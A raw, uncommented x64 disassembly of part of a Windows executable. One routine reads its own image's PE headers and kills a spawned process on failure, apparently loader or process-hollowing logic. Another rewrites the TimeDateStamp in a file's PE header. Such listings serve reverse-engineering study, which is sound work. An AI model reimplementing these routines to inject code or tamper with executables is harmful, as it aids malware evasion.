0000000140005e88  lea      r8, [rbp - 0x20]                                
0000000140005e8c  mov      rcx, qword ptr [rbp + 0x30]                     
0000000140005e90  mov      byte ptr [rbp - 8], r13b                        
0000000140005e94  call     0x140005334                                      ; 0x140005334
0000000140005e99  test     al, al                                          
0000000140005e9b  je       0x140005ea6                                      ; 0x140005ea6
0000000140005e9d  mov      sil, 1                                           ; 0x1
0000000140005ea0  cmp      byte ptr [rbp - 8], r13b                        
0000000140005ea4  jne      0x140005ea9                                      ; 0x140005ea9
0000000140005ea6  mov      sil, r13b                                       
0000000140005ea9  cmp      qword ptr [rbp + 0x30], r13                     
0000000140005ead  je       0x140005ec4                                      ; 0x140005ec4
0000000140005eaf  call     qword ptr [rip + 0x22a3]                         ; 0x140008158 KERNEL32.DLL!GetProcessHeap
0000000140005eb5  mov      r8, qword ptr [rbp + 0x30]                      
0000000140005eb9  xor      edx, edx                                        
0000000140005ebb  mov      rcx, rax                                        
0000000140005ebe  call     qword ptr [rip + 0x221c]                         ; 0x1400080e0 KERNEL32.DLL!HeapFree
0000000140005ec4  test     di, di                                          
0000000140005ec7  je       0x140005eff                                      ; 0x140005eff
0000000140005ec9  lea      r8, [rbp - 0x20]                                
0000000140005ecd  mov      byte ptr [rbp - 8], r13b                        
0000000140005ed1  mov      rdx, r12                                        
0000000140005ed4  mov      rcx, r15                                        
0000000140005ed7  call     0x140005334                                      ; 0x140005334
0000000140005edc  test     al, al                                          
0000000140005ede  je       0x140005ee8                                      ; 0x140005ee8
0000000140005ee0  mov      al, 1                                            ; 0x1
0000000140005ee2  cmp      byte ptr [rbp - 8], r13b                        
0000000140005ee6  jne      0x140005eeb                                      ; 0x140005eeb
0000000140005ee8  mov      al, r13b                                        
0000000140005eeb  cmp      sil, al                                         
0000000140005eee  jne      0x140005eff                                      ; 0x140005eff
0000000140005ef0  cmp      bx, 2                                            ; 0x2
0000000140005ef4  je       0x140005efb                                      ; 0x140005efb
0000000140005ef6  cmp      di, bx                                          
0000000140005ef9  jne      0x140005eff                                      ; 0x140005eff
0000000140005efb  mov      al, 1                                            ; 0x1
0000000140005efd  jmp      0x140005f01                                      ; 0x140005f01
0000000140005eff  xor      al, al                                          
0000000140005f01  lea      r11, [rsp + 0x40]                               
0000000140005f06  mov      rbx, qword ptr [r11 + 0x38]                     
0000000140005f0a  mov      rsi, qword ptr [r11 + 0x40]                     
0000000140005f0e  mov      rsp, r11                                        
0000000140005f11  pop      r15                                             
0000000140005f13  pop      r13                                             
0000000140005f15  pop      r12                                             
0000000140005f17  pop      rdi                                             
0000000140005f18  pop      rbp                                             
0000000140005f19  ret                                                      
0000000140005f1a  int3                                                     
0000000140005f1b  int3                                                     

; FUNCTION 0x140005f1c

0000000140005f1c  mov      qword ptr [rsp + 0x10], rbx                     
0000000140005f21  mov      qword ptr [rsp + 0x18], rsi                     
0000000140005f26  push     rbp                                             
0000000140005f27  push     rdi                                             
0000000140005f28  push     r14                                             
0000000140005f2a  lea      rbp, [rsp - 0x90]                               
0000000140005f32  sub      rsp, 0x190                                       ; 0x190
0000000140005f39  mov      rax, qword ptr [rip + 0x6100]                    ; 0x14000c040
0000000140005f40  xor      rax, rsp                                        
0000000140005f43  mov      qword ptr [rbp + 0x80], rax                     
0000000140005f4a  mov      r14, rcx                                        
0000000140005f4d  mov      ebx, 0x104                                       ; 0x104
0000000140005f52  mov      r8d, ebx                                        
0000000140005f55  lea      rcx, [rsp + 0x70]                               
0000000140005f5a  xor      edx, edx                                        
0000000140005f5c  call     0x140007214                                      ; 0x140007214
0000000140005f61  mov      r8d, ebx                                        
0000000140005f64  lea      rdx, [rsp + 0x70]                               
0000000140005f69  xor      ecx, ecx                                        
0000000140005f6b  call     qword ptr [rip + 0x2157]                         ; 0x1400080c8 KERNEL32.DLL!GetModuleFileNameA
0000000140005f71  dec      eax                                             
0000000140005f73  cmp      eax, 0x102                                       ; 0x102
0000000140005f78  ja       0x140006120                                      ; 0x140006120
0000000140005f7e  lea      r8, [rsp + 0x20]                                
0000000140005f83  mov      qword ptr [rsp + 0x28], 0                        ; 0x0
0000000140005f8c  lea      rdx, [rsp + 0x28]                               
0000000140005f91  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140005f9a  lea      rcx, [rsp + 0x70]                               
0000000140005f9f  call     0x140005638                                      ; 0x140005638
0000000140005fa4  test     al, al                                          
0000000140005fa6  je       0x140006120                                      ; 0x140006120
0000000140005fac  mov      rdi, qword ptr [rsp + 0x28]                     
0000000140005fb1  lea      r8, [rsp + 0x30]                                
0000000140005fb6  mov      rdx, qword ptr [rsp + 0x20]                     
0000000140005fbb  mov      rcx, rdi                                        
0000000140005fbe  mov      qword ptr [rsp + 0x30], 0                        ; 0x0
0000000140005fc7  call     0x1400054ec                                      ; 0x1400054ec
0000000140005fcc  mov      rbx, rax                                        
0000000140005fcf  test     rdi, rdi                                        
0000000140005fd2  je       0x140005fe8                                      ; 0x140005fe8
0000000140005fd4  call     qword ptr [rip + 0x217e]                         ; 0x140008158 KERNEL32.DLL!GetProcessHeap
0000000140005fda  mov      r8, rdi                                         
0000000140005fdd  xor      edx, edx                                        
0000000140005fdf  mov      rcx, rax                                        
0000000140005fe2  call     qword ptr [rip + 0x20f8]                         ; 0x1400080e0 KERNEL32.DLL!HeapFree
0000000140005fe8  test     rbx, rbx                                        
0000000140005feb  je       0x140006120                                      ; 0x140006120
0000000140005ff1  mov      rdi, qword ptr [rsp + 0x30]                     
0000000140005ff6  lea      r8, [rsp + 0x38]                                
0000000140005ffb  mov      rdx, rdi                                        
0000000140005ffe  mov      byte ptr [rsp + 0x50], 0                         ; 0x0
0000000140006003  mov      rcx, rbx                                        
0000000140006006  call     0x140005334                                      ; 0x140005334
000000014000600b  test     al, al                                          
000000014000600d  je       0x14000610f                                      ; 0x14000610f
0000000140006013  mov      cl, byte ptr [rsp + 0x50]                       
0000000140006017  mov      al, cl                                          
0000000140006019  neg      al                                              
000000014000601b  sbb      dx, dx                                          
000000014000601e  and      dx, 0x100                                        ; 0x100
0000000140006023  add      dx, 0x10b                                        ; 0x10b
0000000140006028  test     cl, cl                                          
000000014000602a  je       0x14000603a                                      ; 0x14000603a
000000014000602c  mov      eax, 0x20b                                       ; 0x20b
0000000140006031  cmp      dx, ax                                          
0000000140006034  jne      0x14000610f                                      ; 0x14000610f
000000014000603a  lea      r8, [rsp + 0x38]                                
000000014000603f  mov      byte ptr [rsp + 0x50], 0                         ; 0x0
0000000140006044  mov      rdx, rdi                                        
0000000140006047  mov      rcx, rbx                                        
000000014000604a  call     0x140005334                                      ; 0x140005334
000000014000604f  test     al, al                                          
0000000140006051  je       0x14000605f                                      ; 0x14000605f
0000000140006053  cmp      byte ptr [rsp + 0x50], 0                         ; 0x0
0000000140006058  je       0x14000605f                                      ; 0x14000605f
000000014000605a  xor      sil, sil                                        
000000014000605d  jmp      0x140006062                                      ; 0x140006062
000000014000605f  mov      sil, 1                                           ; 0x1
0000000140006062  mov      r8, r14                                         
0000000140006065  mov      rdx, rdi                                        
0000000140006068  mov      rcx, rbx                                        
000000014000606b  call     0x140005dbc                                      ; 0x140005dbc
0000000140006070  test     al, al                                          
0000000140006072  je       0x14000610f                                      ; 0x14000610f
0000000140006078  xorps    xmm0, xmm0                                      
000000014000607b  lea      r8, [rsp + 0x58]                                
0000000140006080  xor      eax, eax                                        
0000000140006082  lea      rdx, [rsp + 0x70]                               
0000000140006087  mov      rcx, r14                                        
000000014000608a  mov      qword ptr [rsp + 0x68], rax                     
000000014000608f  movups   xmmword ptr [rsp + 0x58], xmm0                  
0000000140006094  call     0x140005968                                      ; 0x140005968
0000000140006099  test     al, al                                          
000000014000609b  je       0x14000610f                                      ; 0x14000610f
000000014000609d  mov      r9b, sil                                        
00000001400060a0  lea      r8, [rsp + 0x58]                                
00000001400060a5  mov      rdx, rdi                                        
00000001400060a8  mov      rcx, rbx                                        
00000001400060ab  call     0x140005c8c                                      ; 0x140005c8c
00000001400060b0  mov      sil, al                                         
00000001400060b3  test     al, al                                          
00000001400060b5  jne      0x1400060e3                                      ; 0x1400060e3
00000001400060b7  mov      r8d, dword ptr [rsp + 0x68]                     
00000001400060bc  xor      edx, edx                                        
00000001400060be  lea      ecx, [rdx + 1]                                  
00000001400060c1  call     qword ptr [rip + 0x20a9]                         ; 0x140008170 KERNEL32.DLL!OpenProcess
00000001400060c7  mov      rdi, rax                                        
00000001400060ca  test     rax, rax                                        
00000001400060cd  je       0x1400060e3                                      ; 0x1400060e3
00000001400060cf  xor      edx, edx                                        
00000001400060d1  mov      rcx, rax                                        
00000001400060d4  call     qword ptr [rip + 0x20f6]                         ; 0x1400081d0 KERNEL32.DLL!TerminateProcess
00000001400060da  mov      rcx, rdi                                        
00000001400060dd  call     qword ptr [rip + 0x1f95]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
00000001400060e3  xor      edx, edx                                        
00000001400060e5  mov      r8d, 0x8000                                      ; 0x8000
00000001400060eb  mov      rcx, rbx                                        
00000001400060ee  call     qword ptr [rip + 0x1ff4]                         ; 0x1400080e8 KERNEL32.DLL!VirtualFree
00000001400060f4  mov      rcx, qword ptr [rsp + 0x60]                     
00000001400060f9  call     qword ptr [rip + 0x1f79]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
00000001400060ff  mov      rcx, qword ptr [rsp + 0x58]                     
0000000140006104  call     qword ptr [rip + 0x1f6e]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
000000014000610a  mov      al, sil                                         
000000014000610d  jmp      0x140006122                                      ; 0x140006122
000000014000610f  xor      edx, edx                                        
0000000140006111  mov      r8d, 0x8000                                      ; 0x8000
0000000140006117  mov      rcx, rbx                                        
000000014000611a  call     qword ptr [rip + 0x1fc8]                         ; 0x1400080e8 KERNEL32.DLL!VirtualFree
0000000140006120  xor      al, al                                          
0000000140006122  mov      rcx, qword ptr [rbp + 0x80]                     
0000000140006129  xor      rcx, rsp                                        
000000014000612c  call     0x1400062f0                                      ; 0x1400062f0
0000000140006131  lea      r11, [rsp + 0x190]                              
0000000140006139  mov      rbx, qword ptr [r11 + 0x28]                     
000000014000613d  mov      rsi, qword ptr [r11 + 0x30]                     
0000000140006141  mov      rsp, r11                                        
0000000140006144  pop      r14                                             
0000000140006146  pop      rdi                                             
0000000140006147  pop      rbp                                             
0000000140006148  ret                                                      
0000000140006149  int3                                                     
000000014000614a  int3                                                     
000000014000614b  int3                                                     

; FUNCTION 0x14000614c

000000014000614c  mov      qword ptr [rsp + 0x10], rbx                     
0000000140006151  mov      qword ptr [rsp + 0x18], rdi                     
0000000140006156  push     r14                                             
0000000140006158  sub      rsp, 0x60                                        ; 0x60
000000014000615c  mov      rax, qword ptr [rip + 0x5edd]                    ; 0x14000c040
0000000140006163  xor      rax, rsp                                        
0000000140006166  mov      qword ptr [rsp + 0x50], rax                     
000000014000616b  xor      r9d, r9d                                        
000000014000616e  mov      qword ptr [rsp + 0x30], 0                        ; 0x0
0000000140006177  mov      dword ptr [rsp + 0x28], 0x80                     ; 0x80
000000014000617f  mov      edx, 0xc0000000                                  ; 0xc0000000
0000000140006184  mov      dword ptr [rsp + 0x20], 3                        ; 0x3
000000014000618c  lea      r14d, [r9 + 1]                                  
0000000140006190  mov      r8d, r14d                                       
0000000140006193  call     qword ptr [rip + 0x1f8f]                         ; 0x140008128 KERNEL32.DLL!CreateFileA
0000000140006199  xor      bl, bl                                          
000000014000619b  mov      rdi, rax                                        
000000014000619e  cmp      rax, -1                                          ; -0x1
00000001400061a2  je       0x140006259                                      ; 0x140006259
00000001400061a8  xor      ecx, ecx                                        
00000001400061aa  call     qword ptr [rip + 0x23a8]                         ; 0x140008558 api-ms-win-crt-time-l1-1-0.dll!_time64
00000001400061b0  xor      r9d, r9d                                        
00000001400061b3  mov      dword ptr [rsp + 0x44], 0                        ; 0x0
00000001400061bb  xor      r8d, r8d                                        
00000001400061be  mov      dword ptr [rsp + 0x48], eax                     
00000001400061c2  lea      edx, [r14 + 0x3b]                               
00000001400061c6  mov      rcx, rdi                                        
00000001400061c9  call     qword ptr [rip + 0x1f41]                         ; 0x140008110 KERNEL32.DLL!SetFilePointer
00000001400061cf  lea      r9, [rsp + 0x40]                                
00000001400061d4  mov      dword ptr [rsp + 0x40], 0                        ; 0x0
00000001400061dc  lea      r8d, [r14 + 3]                                  
00000001400061e0  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400061e9  lea      rdx, [rsp + 0x44]                               
00000001400061ee  mov      rcx, rdi                                        
00000001400061f1  call     qword ptr [rip + 0x1ec9]                         ; 0x1400080c0 KERNEL32.DLL!ReadFile
00000001400061f7  test     eax, eax                                        
00000001400061f9  je       0x140006250                                      ; 0x140006250
00000001400061fb  cmp      dword ptr [rsp + 0x40], 4                        ; 0x4
0000000140006200  jne      0x140006250                                      ; 0x140006250
0000000140006202  mov      edx, dword ptr [rsp + 0x44]                     
0000000140006206  xor      r9d, r9d                                        
0000000140006209  add      edx, 8                                           ; 0x8
000000014000620c  xor      r8d, r8d                                        
000000014000620f  mov      rcx, rdi                                        
0000000140006212  call     qword ptr [rip + 0x1ef8]                         ; 0x140008110 KERNEL32.DLL!SetFilePointer
0000000140006218  lea      r9, [rsp + 0x40]                                
000000014000621d  mov      dword ptr [rsp + 0x40], 0                        ; 0x0
0000000140006225  lea      r8d, [r14 + 3]                                  
0000000140006229  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140006232  lea      rdx, [rsp + 0x48]                               
0000000140006237  mov      rcx, rdi                                        
000000014000623a  call     qword ptr [rip + 0x1eb0]                         ; 0x1400080f0 KERNEL32.DLL!WriteFile
0000000140006240  test     eax, eax                                        
0000000140006242  je       0x140006250                                      ; 0x140006250
0000000140006244  cmp      dword ptr [rsp + 0x40], 4                        ; 0x4
0000000140006249  movzx    ebx, bl                                         
000000014000624c  cmove    ebx, r14d                                       
0000000140006250  mov      rcx, rdi                                        
0000000140006253  call     qword ptr [rip + 0x1e1f]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
0000000140006259  mov      al, bl                                          
000000014000625b  mov      rcx, qword ptr [rsp + 0x50]                     
0000000140006260  xor      rcx, rsp                                        
0000000140006263  call     0x1400062f0                                      ; 0x1400062f0
0000000140006268  lea      r11, [rsp + 0x60]                               
000000014000626d  mov      rbx, qword ptr [r11 + 0x18]                     
0000000140006271  mov      rdi, qword ptr [r11 + 0x20]                     
0000000140006275  mov      rsp, r11                                        
0000000140006278  pop      r14                                             
000000014000627a  ret                                                      
000000014000627b  jmp      qword ptr [rip + 0x1fff]                         ; 0x140008280 MSVCP140.dll!??1_Lockit@std@@QEAA@XZ
0000000140006281  int3                                                     
0000000140006282  int3                                                     
0000000140006283  int3                                                     
0000000140006284  int3                                                     
0000000140006285  int3                                                     
0000000140006286  int3                                                     
0000000140006287  int3                                                     
0000000140006288  int3                                                     
0000000140006289  int3                                                     
000000014000628a  int3                                                     
000000014000628b  int3                                                     
000000014000628c  int3                                                     
000000014000628d  int3                                                     
000000014000628e  int3                                                     
000000014000628f  int3                                                     

; FUNCTION 0x140006290

0000000140006290  push     rbx                                             
0000000140006292  sub      rsp, 0x20                                        ; 0x20
0000000140006296  mov      rbx, rcx                                        
0000000140006299  mov      ecx, 0x10                                        ; 0x10
000000014000629e  call     qword ptr [rip + 0x214c]                         ; 0x1400083f0 api-ms-win-crt-heap-l1-1-0.dll!malloc
00000001400062a4  mov      rdx, rax                                        
00000001400062a7  test     rax, rax                                        
00000001400062aa  je       0x1400062c7                                      ; 0x1400062c7
00000001400062ac  mov      rax, qword ptr [rip + 0x5edd]                    ; 0x14000c190
00000001400062b3  mov      qword ptr [rdx], rax                            
00000001400062b6  mov      qword ptr [rdx + 8], rbx                        
00000001400062ba  mov      qword ptr [rip + 0x5ecf], rdx                    ; 0x14000c190
00000001400062c1  add      rsp, 0x20                                        ; 0x20
00000001400062c5  pop      rbx                                             
00000001400062c6  ret                                                      
00000001400062c7  call     0x1400062cd                                      ; 0x1400062cd
00000001400062cc  int3                                                     
00000001400062cd  jmp      qword ptr [rip + 0x1f9d]                         ; 0x140008270 MSVCP140.dll!?_Xbad_alloc@std@@YAXXZ
00000001400062d3  int3                                                     
00000001400062d4  int3                                                     
00000001400062d5  int3                                                     
00000001400062d6  int3                                                     
00000001400062d7  int3                                                     
00000001400062d8  int3                                                     
00000001400062d9  int3                                                     
00000001400062da  int3                                                     
00000001400062db  int3                                                     
00000001400062dc  int3                                                     
00000001400062dd  int3                                                     
00000001400062de  int3                                                     
00000001400062df  int3                                                     
00000001400062e0  int3                                                     
00000001400062e1  int3                                                     
00000001400062e2  int3                                                     
00000001400062e3  int3                                                     
00000001400062e4  int3                                                     
00000001400062e5  int3                                                     
00000001400062e6  nop      word ptr [rax + rax]                            

; FUNCTION 0x1400062f0

00000001400062f0  cmp      rcx, qword ptr [rip + 0x5d49]                    ; 0x14000c040
00000001400062f7  jne      0x140006309                                      ; 0x140006309
00000001400062f9  rol      rcx, 0x10                                        ; 0x10
00000001400062fd  test     cx, 0xffff                                       ; 0xffff
0000000140006302  jne      0x140006305                                      ; 0x140006305
0000000140006304  ret                                                      
0000000140006305  ror      rcx, 0x10                                        ; 0x10
0000000140006309  jmp      0x1400068d0                                      ; 0x1400068d0
000000014000630e  int3                                                     
000000014000630f  int3                                                     
0000000140006310  jmp      0x140006370                                      ; 0x140006370
0000000140006315  int3                                                     
0000000140006316  int3                                                     
0000000140006317  int3                                                     
0000000140006318  int3                                                     
0000000140006319  int3                                                     
000000014000631a  int3                                                     
000000014000631b  int3                                                     
000000014000631c  int3                                                     
000000014000631d  int3                                                     
000000014000631e  int3                                                     
000000014000631f  int3                                                     

; FUNCTION 0x140006320

0000000140006320  push     rbx                                             
0000000140006322  sub      rsp, 0x20                                        ; 0x20
0000000140006326  mov      rbx, rcx                                        
0000000140006329  call     0x140006f20                                      ; 0x140006f20
000000014000632e  test     rax, rax                                        
0000000140006331  jne      0x14000634c                                      ; 0x14000634c
0000000140006333  mov      rcx, rbx                                        
0000000140006336  call     0x140006f26                                      ; 0x140006f26
000000014000633b  test     eax, eax                                        
000000014000633d  je       0x140006352                                      ; 0x140006352
000000014000633f  mov      rcx, rbx                                        
0000000140006342  call     0x140006f20                                      ; 0x140006f20
0000000140006347  test     rax, rax                                        
000000014000634a  je       0x140006333                                      ; 0x140006333
000000014000634c  add      rsp, 0x20                                        ; 0x20
0000000140006350  pop      rbx                                             
0000000140006351  ret                                                      
0000000140006352  cmp      rbx, -1                                          ; -0x1
0000000140006356  je       0x14000635e                                      ; 0x14000635e
0000000140006358  call     0x140006910                                      ; 0x140006910
000000014000635d  int3                                                     
000000014000635e  call     0x140001190                                      ; 0x140001190
0000000140006363  int3                                                     
0000000140006364  int3                                                     
0000000140006365  int3                                                     
0000000140006366  int3                                                     
0000000140006367  int3                                                     
0000000140006368  int3                                                     
0000000140006369  int3                                                     
000000014000636a  int3                                                     
000000014000636b  int3                                                     
000000014000636c  int3                                                     
000000014000636d  int3                                                     
000000014000636e  int3                                                     
000000014000636f  int3                                                     
0000000140006370  jmp      0x140006f1a                                      ; 0x140006f1a
0000000140006375  int3                                                     
0000000140006376  int3                                                     
0000000140006377  int3                                                     
0000000140006378  int3                                                     
0000000140006379  int3                                                     
000000014000637a  int3                                                     
000000014000637b  int3                                                     
000000014000637c  int3                                                     
000000014000637d  int3                                                     
000000014000637e  int3                                                     
000000014000637f  int3                                                     
0000000140006380  jmp      0x140006320                                      ; 0x140006320
0000000140006385  int3                                                     
0000000140006386  int3                                                     
0000000140006387  int3                                                     
0000000140006388  int3                                                     
0000000140006389  int3                                                     
000000014000638a  int3                                                     
000000014000638b  int3                                                     
000000014000638c  int3                                                     
000000014000638d  int3                                                     
000000014000638e  int3                                                     
000000014000638f  int3                                                     

; FUNCTION 0x140006390

0000000140006390  push     rbx                                             
0000000140006392  sub      rsp, 0x20                                        ; 0x20
0000000140006396  lea      rax, [rip + 0x228b]                              ; 0x140008628
000000014000639d  mov      rbx, rcx                                        
00000001400063a0  mov      qword ptr [rcx], rax                            
00000001400063a3  test     dl, 1                                            ; 0x1
00000001400063a6  je       0x1400063b2                                      ; 0x1400063b2
00000001400063a8  mov      edx, 0x18                                        ; 0x18
00000001400063ad  call     0x140006310                                      ; 0x140006310
00000001400063b2  mov      rax, rbx                                        
00000001400063b5  add      rsp, 0x20                                        ; 0x20
00000001400063b9  pop      rbx                                             
00000001400063ba  ret                                                      
00000001400063bb  int3                                                     
00000001400063bc  int3                                                     
00000001400063bd  int3                                                     
00000001400063be  int3                                                     
00000001400063bf  int3                                                     

; FUNCTION 0x1400063c0

00000001400063c0  push     rbx                                             
00000001400063c2  sub      rsp, 0x20                                        ; 0x20
00000001400063c6  mov      ecx, 1                                           ; 0x1
00000001400063cb  call     0x140006f32                                      ; 0x140006f32
00000001400063d0  call     0x140006a10                                      ; 0x140006a10
00000001400063d5  mov      ecx, eax                                        
00000001400063d7  call     0x140006f62                                      ; 0x140006f62
00000001400063dc  call     0x1400069f0                                      ; 0x1400069f0
00000001400063e1  mov      ebx, eax                                        
00000001400063e3  call     0x140006f92                                      ; 0x140006f92
00000001400063e8  mov      ecx, 1                                           ; 0x1
00000001400063ed  mov      dword ptr [rax], ebx                            
00000001400063ef  call     0x1400066e0                                      ; 0x1400066e0
00000001400063f4  test     al, al                                          
00000001400063f6  je       0x14000646b                                      ; 0x14000646b
00000001400063f8  call     0x140006b90                                      ; 0x140006b90
00000001400063fd  lea      rcx, [rip + 0x7dc]                               ; 0x140006be0
0000000140006404  call     0x140006880                                      ; 0x140006880
0000000140006409  call     0x140006a00                                      ; 0x140006a00
000000014000640e  mov      ecx, eax                                        
0000000140006410  call     0x140006f3e                                      ; 0x140006f3e
0000000140006415  test     eax, eax                                        
0000000140006417  jne      0x14000646b                                      ; 0x14000646b
0000000140006419  call     0x140006a20                                      ; 0x140006a20
000000014000641e  call     0x140006a70                                      ; 0x140006a70
0000000140006423  test     eax, eax                                        
0000000140006425  je       0x140006433                                      ; 0x140006433
0000000140006427  lea      rcx, [rip + 0x5c2]                               ; 0x1400069f0
000000014000642e  call     0x140006f38                                      ; 0x140006f38
0000000140006433  call     0x1400068c0                                      ; 0x1400068c0
0000000140006438  call     0x1400068c0                                      ; 0x1400068c0
000000014000643d  call     0x1400069f0                                      ; 0x1400069f0
0000000140006442  mov      ecx, eax                                        
0000000140006444  call     0x140006f86                                      ; 0x140006f86
0000000140006449  call     0x140006a30                                      ; 0x140006a30
000000014000644e  test     al, al                                          
0000000140006450  je       0x140006457                                      ; 0x140006457
0000000140006452  call     0x140006f44                                      ; 0x140006f44
0000000140006457  call     0x1400069f0                                      ; 0x1400069f0
000000014000645c  call     0x140006ab0                                      ; 0x140006ab0
0000000140006461  test     eax, eax                                        
0000000140006463  jne      0x14000646b                                      ; 0x14000646b
0000000140006465  add      rsp, 0x20                                        ; 0x20
0000000140006469  pop      rbx                                             
000000014000646a  ret                                                      
000000014000646b  mov      ecx, 7                                           ; 0x7
0000000140006470  call     0x140006aa0                                      ; 0x140006aa0
0000000140006475  int3                                                     
0000000140006476  int3                                                     
0000000140006477  int3                                                     
0000000140006478  int3                                                     
0000000140006479  int3                                                     
000000014000647a  int3                                                     
000000014000647b  int3                                                     
000000014000647c  int3                                                     
000000014000647d  int3                                                     
000000014000647e  int3                                                     
000000014000647f  int3                                                     

; FUNCTION 0x140006480

0000000140006480  sub      rsp, 0x28                                        ; 0x28
0000000140006484  call     0x140006a50                                      ; 0x140006a50
0000000140006489  xor      eax, eax                                        
000000014000648b  add      rsp, 0x28                                        ; 0x28
000000014000648f  ret                                                      

; FUNCTION 0x140006490

0000000140006490  sub      rsp, 0x28                                        ; 0x28
0000000140006494  call     0x140006b20                                      ; 0x140006b20
0000000140006499  call     0x1400069f0                                      ; 0x1400069f0
000000014000649e  mov      ecx, eax                                        
00000001400064a0  add      rsp, 0x28                                        ; 0x28
00000001400064a4  jmp      0x140006f8c                                      ; 0x140006f8c
00000001400064a9  int3                                                     
00000001400064aa  int3                                                     
00000001400064ab  int3                                                     
00000001400064ac  int3                                                     
00000001400064ad  int3                                                     
00000001400064ae  int3                                                     
00000001400064af  int3                                                     

; FUNCTION 0x1400064b0

00000001400064b0  mov      qword ptr [rsp + 8], rbx                        
00000001400064b5  mov      qword ptr [rsp + 0x10], rsi                     
00000001400064ba  push     rdi                                             
00000001400064bb  sub      rsp, 0x30                                        ; 0x30
00000001400064bf  mov      ecx, 1                                           ; 0x1
00000001400064c4  call     0x1400066a0                                      ; 0x1400066a0
00000001400064c9  test     al, al                                          
00000001400064cb  je       0x14000660a                                      ; 0x14000660a
00000001400064d1  xor      sil, sil                                        
00000001400064d4  mov      byte ptr [rsp + 0x20], sil                      
00000001400064d9  call     0x140006650                                      ; 0x140006650
00000001400064de  movzx    ebx, al                                         
00000001400064e1  mov      ecx, dword ptr [rip + 0x5cb9]                    ; 0x14000c1a0
00000001400064e7  cmp      ecx, 1                                           ; 0x1
00000001400064ea  je       0x140006615                                      ; 0x140006615
00000001400064f0  test     ecx, ecx                                        
00000001400064f2  jne      0x14000653e                                      ; 0x14000653e
00000001400064f4  mov      dword ptr [rip + 0x5ca2], 1                      ; 0x14000c1a0 | 0x1
00000001400064fe  lea      rdx, [rip + 0x20eb]                              ; 0x1400085f0
0000000140006505  lea      rcx, [rip + 0x20cc]                              ; 0x1400085d8
000000014000650c  call     0x140006f56                                      ; 0x140006f56
0000000140006511  test     eax, eax                                        
0000000140006513  je       0x14000651f                                      ; 0x14000651f
0000000140006515  mov      eax, 0xff                                        ; 0xff
000000014000651a  jmp      0x1400065fa                                      ; 0x1400065fa
000000014000651f  lea      rdx, [rip + 0x20aa]                              ; 0x1400085d0
0000000140006526  lea      rcx, [rip + 0x208b]                              ; 0x1400085b8
000000014000652d  call     0x140006f50                                      ; 0x140006f50
0000000140006532  mov      dword ptr [rip + 0x5c64], 2                      ; 0x14000c1a0 | 0x2
000000014000653c  jmp      0x140006546                                      ; 0x140006546
000000014000653e  mov      sil, 1                                           ; 0x1
0000000140006541  mov      byte ptr [rsp + 0x20], sil                      
0000000140006546  movzx    ecx, bl                                         
0000000140006549  call     0x140006820                                      ; 0x140006820
000000014000654e  call     0x140006a80                                      ; 0x140006a80
0000000140006553  mov      rbx, rax                                        
0000000140006556  cmp      qword ptr [rax], 0                               ; 0x0
000000014000655a  je       0x14000657b                                      ; 0x14000657b
000000014000655c  mov      rcx, rax                                        
000000014000655f  call     0x140006780                                      ; 0x140006780
0000000140006564  test     al, al                                          
0000000140006566  je       0x14000657b                                      ; 0x14000657b
0000000140006568  xor      r8d, r8d                                        
000000014000656b  mov      edx, 2                                           ; 0x2
0000000140006570  xor      ecx, ecx                                        
0000000140006572  mov      rax, qword ptr [rbx]                            
0000000140006575  call     qword ptr [rip + 0x2015]                         ; 0x140008590
000000014000657b  call     0x140006a90                                      ; 0x140006a90
0000000140006580  mov      rbx, rax                                        
0000000140006583  cmp      qword ptr [rax], 0                               ; 0x0
0000000140006587  je       0x14000659d                                      ; 0x14000659d
0000000140006589  mov      rcx, rax                                        
000000014000658c  call     0x140006780                                      ; 0x140006780
0000000140006591  test     al, al                                          
0000000140006593  je       0x14000659d                                      ; 0x14000659d
0000000140006595  mov      rcx, qword ptr [rbx]                            
0000000140006598  call     0x140006f80                                      ; 0x140006f80
000000014000659d  call     0x140006f4a                                      ; 0x140006f4a
00000001400065a2  mov      rdi, rax                                        
00000001400065a5  call     0x140006f6e                                      ; 0x140006f6e
00000001400065aa  mov      rbx, qword ptr [rax]                            
00000001400065ad  call     0x140006f68                                      ; 0x140006f68
00000001400065b2  mov      r8, rdi                                         
00000001400065b5  mov      rdx, rbx                                        
00000001400065b8  mov      ecx, dword ptr [rax]                            
00000001400065ba  call     0x140003f00                                      ; 0x140003f00
00000001400065bf  mov      ebx, eax                                        
00000001400065c1  call     0x140006ac0                                      ; 0x140006ac0
00000001400065c6  test     al, al                                          
00000001400065c8  je       0x14000661f                                      ; 0x14000661f
00000001400065ca  test     sil, sil                                        
00000001400065cd  jne      0x1400065d4                                      ; 0x1400065d4
00000001400065cf  call     0x140006f74                                      ; 0x140006f74
00000001400065d4  xor      edx, edx                                        
00000001400065d6  mov      cl, 1                                            ; 0x1
00000001400065d8  call     0x140006850                                      ; 0x140006850
00000001400065dd  mov      eax, ebx                                        
00000001400065df  jmp      0x1400065fa                                      ; 0x1400065fa
00000001400065e1  mov      ebx, eax                                        
00000001400065e3  call     0x140006ac0                                      ; 0x140006ac0
00000001400065e8  test     al, al                                          
00000001400065ea  je       0x140006627                                      ; 0x140006627
00000001400065ec  cmp      byte ptr [rsp + 0x20], 0                         ; 0x0
00000001400065f1  jne      0x1400065f8                                      ; 0x1400065f8
00000001400065f3  call     0x140006f7a                                      ; 0x140006f7a
00000001400065f8  mov      eax, ebx                                        
00000001400065fa  mov      rbx, qword ptr [rsp + 0x40]                     
00000001400065ff  mov      rsi, qword ptr [rsp + 0x48]                     
0000000140006604  add      rsp, 0x30                                        ; 0x30
0000000140006608  pop      rdi                                             
0000000140006609  ret                                                      
000000014000660a  mov      ecx, 7                                           ; 0x7
000000014000660f  call     0x140006aa0                                      ; 0x140006aa0
0000000140006614  nop                                                      
0000000140006615  mov      ecx, 7                                           ; 0x7
000000014000661a  call     0x140006aa0                                      ; 0x140006aa0
000000014000661f  mov      ecx, ebx                                        
0000000140006621  call     0x140006f14                                      ; 0x140006f14
0000000140006626  nop                                                      
0000000140006627  mov      ecx, ebx                                        
0000000140006629  call     0x140006f5c                                      ; 0x140006f5c
000000014000662e  nop                                                      
000000014000662f  int3                                                     

; FUNCTION 0x140006630

